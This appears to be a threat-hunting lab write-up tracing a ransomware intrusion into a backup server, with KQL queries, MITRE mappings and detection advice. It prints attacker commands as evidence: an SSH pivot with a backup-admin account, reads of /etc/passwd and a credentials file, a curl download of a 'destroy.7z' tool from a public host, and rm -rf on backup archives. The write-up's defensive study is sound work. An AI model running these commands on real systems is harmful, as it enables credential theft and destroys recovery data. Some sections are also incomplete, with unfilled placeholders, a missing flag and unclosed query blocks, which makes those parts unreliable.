## 🧠 Hunt Overview

This hunt traces the final phase of a credential-based ransomware attack from lateral movement into backup infrastructure through discovery, credential abuse, tool transfer, recovery suppression, and impact. The attacker demonstrated clear knowledge of the environment, prioritizing backup systems and recovery mechanisms to ensure encryption would be irreversible. Rather than relying on exploits, the intrusion abused legitimate credentials and native system utilities, allowing malicious activity to blend into normal administrative behavior. This hunt highlights how low-noise actions, when correlated, reveal a complete ransomware kill chain and expose critical detection gaps prior to impact.

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: LATERAL MOVEMENT - Remote Access</strong></summary>

### 🎯 Objective
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

### 📌 Finding
"ssh.exe" backup-admin@10.1.0.189

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z|
| Process | ssh.exe |
| Parent Process | Unknown |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity maps directly to **MITRE ATT&CK – TA0008: Lateral Movement**, specifically **T1021.004: Remote Services – SSH**. Adversaries who obtain valid credentials frequently use SSH to move laterally within internal networks because it is trusted, encrypted, and often poorly monitored. 

In ransomware and destructive intrusion campaigns, attackers deliberately pivot to backup servers and administrative systems via SSH to disable recovery mechanisms, exfiltrate credentials, or stage payloads prior to impact. Detection of unexpected SSH-based lateral movement is therefore critical for identifying hands-on-keyboard activity during the pre-encryption phase of an attack.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated >= ago(45d)
| where RemotePort == 22
| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Baseline which hosts and user accounts are authorized to initiate SSH sessions to internal systems. Alert on new or rare SSH connections originating from user workstations, especially when targeting backup servers, domain controllers, or other high-value infrastructure, and correlate with credential use, privilege escalation, and subsequent destructive activity.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"

### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating lateral movement, always pivot on the source host and local IP address to anchor attacker activity. Use the identified source system to review process execution, authentication events, and outbound network connections around the same timestamp to determine whether the workstation is an initial foothold or a secondary pivot point. Confirm whether this host routinely initiates remote access sessions or if the behavior is anomalous, and prioritize containment of the source system to prevent further lateral spread.

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: CREDENTIAL ACCESS - Compromised Account</strong></summary>

### 🎯 Objective
Administrative accounts with backup privileges provide access to critical recovery infrastructure.

### 📌 Finding
backup-admin

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z |
| Process | SSH.exe |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity aligns with Valid Accounts – Domain Accounts (MITRE ATT&CK T1078.002), where adversaries use legitimate credentials rather than exploiting vulnerabilities. The use of a backup-related administrative account indicates the attacker has already bypassed preventive controls and is operating with trusted access. Compromise of such accounts is especially dangerous because they provide direct access to recovery infrastructure, enabling attackers to disable backups, move laterally with minimal resistance, and significantly increase the impact of ransomware or destructive attacks.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Identify administrative or service accounts that are used interactively (SSH, RDP) rather than through automated services. Baseline expected usage of backup and recovery accounts, and alert when they are observed initiating remote sessions from user workstations or accessing systems outside their normal scope. Correlate account usage with privilege level, time of day, and lateral movement patterns to detect credential compromise early.

</details>

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: DISCOVERY - Directory Enumeration</strong></summary>

### 🎯 Objective
File system enumeration reveals backup locations and valuable targets for destruction.

### 📌 Finding
ls --color=auto -la /backups/

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:51.749736Z |
| Process | ls |
| Parent Process | bash |
| Command Line | ls --color=auto -la /backups/ |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries enumerate the file system to identify high-value data and infrastructure components. Enumerating the /backups/ directory on a backup server indicates the attacker is actively identifying recovery data that could later be deleted, encrypted, or otherwise rendered unusable. 

When this behavior follows lateral movement into backup infrastructure, it strongly suggests preparation for impact rather than routine administration, and represents one of the final reconnaissance steps before destructive actions.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T05:39:11Z) .. datetime(2025-11-25T06:30:00Z))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("ls ", "dir ", "find ")

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive enumeration commands (e.g., ls, find, dir) executed on backup servers, especially when initiated shortly after new remote access sessions. Baseline normal administrative activity on backup infrastructure and alert when file listing or discovery commands target known backup directories outside of routine maintenance windows, as this often precedes destructive actions.

</details>

---
<details>
<summary id="-flag-5">🚩 <strong>Flag 5: DISCOVERY - File Search</strong></summary>

### 🎯 Objective
Attackers search for specific file types to identify high-value targets.

### 📌 Finding
find /backups -name *.tar.gz

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:06.546964Z |
| Process | find |
| Parent Process | bash |
| Command Line | find /backups -name *.tar.gz |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries search for specific file types to locate high-value data. By targeting compressed backup archives (*.tar.gz) within the /backups directory, the attacker is narrowing in on data that is most valuable for recovery or extortion. 

This indicates focused reconnaissance rather than broad exploration, suggesting the attacker is identifying precise targets for deletion or encryption as part of a planned impact phase.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName has "azuki-backupsrv"

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for targeted file search commands such as find executed against backup directories, especially when filtering for archive or backup-related extensions (e.g., .tar.gz, .zip, .bak). These searches are rarely part of routine administration and often indicate attackers are identifying specific data for destruction or exfiltration. Correlate file search activity with prior remote access, directory enumeration, and privileged account usage to detect attacks progressing toward impact.

</details>

---
<details>
<summary id="-flag-6">🚩 <strong>Flag 6: DISCOVERY - Account Enumeration</strong></summary>

### 🎯 Objective
Attackers enumerate local accounts to understand the system's user base.

### 📌 Finding
cat /etc/passwd

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:08.673485Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/passwd |

### 💡 Why it matters
This activity aligns with Account Discovery (MITRE ATT&CK T1087), where adversaries enumerate local accounts to understand which identities exist on a system. Reading /etc/passwd allows an attacker to identify human users, service accounts, login shells, and potential privilege boundaries. 

On a backup server, this reconnaissance helps the attacker determine which accounts may be leveraged for privilege escalation, credential reuse, or broader lateral movement before executing impact actions.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to local account databases such as /etc/passwd, /etc/shadow, or account enumeration utilities (getent, id, lslogins) on backup and infrastructure servers. These actions are uncommon outside of troubleshooting or audits and should be correlated with recent remote access sessions and elevated account usage. Prioritize investigation when account enumeration occurs shortly after lateral movement, as it often precedes privilege escalation or destructive activity.

</details>

---
<details>
<summary id="-flag-7">🚩 <strong>Flag 7: DISCOVERY - Scheduled Job Reconnaissance</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /etc/crontab

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | <Placeholder> |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/crontab |

### 💡 Why it matters
This activity aligns with Scheduled Task/Job Discovery (MITRE ATT&CK T1053.003 – Cron), where adversaries inspect scheduled jobs to understand automated system behavior. By reviewing /etc/crontab, the attacker can identify backup schedules, maintenance tasks, and privileged jobs that may be disabled, hijacked, or timed to coincide with destructive actions. 

On a backup server, this reconnaissance helps attackers determine when backups run and how to maximize impact while minimizing detection.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has "/etc/crontab"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to cron configuration files such as /etc/crontab and /etc/cron* on backup and infrastructure servers. These files are rarely accessed outside of maintenance or troubleshooting and should be correlated with recent remote access and discovery activity. 

Prioritize investigation when scheduled job reconnaissance occurs alongside backup enumeration, as attackers often use this information to time or disable recovery mechanisms before impact.

</details>

---
<details>
<summary id="-flag-8">🚩 <strong>Flag 8: COMMAND AND CONTROL - Tool Transfer</strong></summary>

### 🎯 Objective
Attackers download tools from external infrastructure to carry out the attack.

References:

T1105: Ingress Tool Transfer

### 📌 Finding
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:45:34.259149Z |
| Process | curl |
| Parent Process | bash |
| Command Line | curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z |

### 💡 Why it matters
This activity aligns with Ingress Tool Transfer (MITRE ATT&CK T1105), where adversaries introduce external tools into the environment to enable later stages of the attack. Backup servers rarely require outbound downloads from public hosting services, making this behavior highly anomalous. When observed after lateral movement and reconnaissance, ingress tool transfer strongly indicates the attacker is transitioning from discovery to impact, leaving limited time for defenders to intervene.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor critical infrastructure systems, especially backup servers, for interactive use of file transfer utilities such as curl or wget making outbound connections to external hosts. Pay particular attention to downloads originating from public file-hosting services, as these are commonly used to stage tools immediately before destructive actions. Correlate tool transfer activity with prior remote access and reconnaissance to identify attacks approaching the impact phase.

</details>

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: CREDENTIAL ACCESS - Credential Theft</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /backups/configs/all-credentials.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net> |
| Timestamp | 2025-11-24T14:14:14.217788Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /backups/configs/all-credentials.txt |

### 💡 Why it matters
This activity aligns with Credentials from Password Stores (MITRE ATT&CK T1555). Accessing a file explicitly named to contain credentials indicates the attacker is harvesting secrets rather than merely enumerating the system. On a backup server, exposed credentials often grant access to additional infrastructure, significantly expanding attacker reach and accelerating progression toward full environment compromise.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on interactive access to files containing credential-related keywords (e.g., credentials, secrets, .env, .conf) on backup and infrastructure servers. Correlate with prior discovery and lateral movement to identify credential theft occurring late in the intrusion.

</details>

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: IMPACT - Data Destruction</strong></summary>

### 🎯 Objective
Destroying backups eliminates recovery options and maximises ransomware impact.

References:

T1485: Data Destruction

### 📌 Finding
rm -rf /backups/archives

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |

| Process | rm |
| Parent Process | bash |
| Command Line | rm -rf /backups/archives |

### 💡 Why it matters
This activity aligns with Data Destruction (MITRE ATT&CK T1485), where adversaries deliberately delete data to prevent system recovery and maximize operational impact. The use of a recursive deletion command against backup directories indicates intentional destruction of recovery data rather than routine maintenance. 

Once backup data is removed, defenders lose the ability to restore affected systems, significantly increasing the success and leverage of ransomware or destructive attacks.

### 🔧 KQL Query Used

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for recursive file deletion commands such as rm -rf executed on backup or recovery systems, particularly when targeting known backup directories. These actions are rarely legitimate and should be treated as high-severity events requiring immediate response. Correlate deletion activity with prior remote access, reconnaissance, and tool transfer to identify attacks that have reached the impact stage.

### 💡 Why it matters
This activity aligns with Data Encrypted for Impact (MITRE ATT&CK T1486). The creation of a ransom note confirms that the attacker has completed the primary destructive actions and is transitioning to extortion. At this stage, recovery options have already been intentionally degraded or eliminated, and the attacker’s goal is no longer access or disruption but coercion. Detection here indicates the attack has reached its terminal phase.

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for the creation of ransom note files (e.g., *_README.txt) across multiple directories and endpoints within a short timeframe. Correlate file creation with suspicious process execution, encryption activity, and recovery-inhibiting behavior. Treat widespread ransom note creation as a confirmed ransomware incident requiring immediate incident response and containment.

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- Limited detection of credential misuse and lateral movement: The attacker was able to authenticate and move laterally using valid credentials without triggering early alerts, indicating insufficient monitoring of privileged account usage and internal SSH/remote execution activity.
- Insufficient visibility into backup infrastructure activity: Multiple discovery and destructive actions against backup systems (enumeration, deletion, service stoppage) occurred without effective prevention, highlighting weak controls around critical recovery assets.
- Delayed detection of impact-stage behavior: Several high-confidence ransomware indicators (backup deletion, recovery suppression, service termination) were only observable after significant damage had already occurred, reducing the opportunity for effective response.

### Recommendations
- Strengthen monitoring of privileged accounts and internal remote access: Implement alerting for interactive use of administrative and backup-related accounts, especially when originating from user workstations or accessing sensitive infrastructure.
- Harden and isolate backup and recovery systems: Restrict interactive access to backup servers, enforce immutable backups where possible, and closely monitor for destructive commands targeting backup directories, services, and recovery mechanisms.
- Improve correlation and escalation for ransomware precursors: Prioritize alerts that chain lateral movement, discovery, tool transfer, and recovery suppression activity, enabling faster SOC escalation before impact actions are completed.

## 🧾 Final Assessment

The Azuki incident represents a deliberate, end-to-end ransomware operation, not an opportunistic intrusion. Analysis of Microsoft Defender for Endpoint telemetry shows the attackers already possessed valid credentials and leveraged trusted administrative tooling to move laterally from a compromised workstation into the organization’s backup infrastructure. From there, they conducted targeted reconnaissance to identify backup locations, recovery mechanisms, and privileged services before executing coordinated impact actions.

Once inside the backup environment, the attackers systematically eliminated recovery options. Backup directories were enumerated and deleted, backup and scheduling services were stopped and disabled, Volume Shadow Copies were deleted and constrained, and Windows recovery features were explicitly turned off. These actions ensured that even partial restoration attempts would fail. The use of native system utilities (rm, vssadmin, wbadmin, bcdedit, fsutil) allowed the attackers to blend into normal administrative activity while achieving irreversible damage.

Ransomware deployment and propagation were accelerated through remote execution tooling and credential reuse, enabling the payload to be distributed across multiple systems in rapid succession. The creation of ransom notes on all affected hosts confirms that encryption and extortion were the final objectives, executed only after recovery mechanisms had been neutralized. At this stage, defender options were limited to containment and incident response rather than prevention.

In summary, the attackers reached the backup infrastructure through credential-based lateral movement, destroyed both data and recovery capabilities in a calculated sequence, and spread ransomware quickly using legitimate administrative tools. While endpoint telemetry captured each stage of the attack, detection occurred largely after the attackers had achieved strategic objectives, leaving the organization with minimal recovery options. This incident highlights the critical need for earlier detection of credential misuse, stricter controls around backup systems, and faster SOC escalation when pre-impact ransomware behaviors are observed.
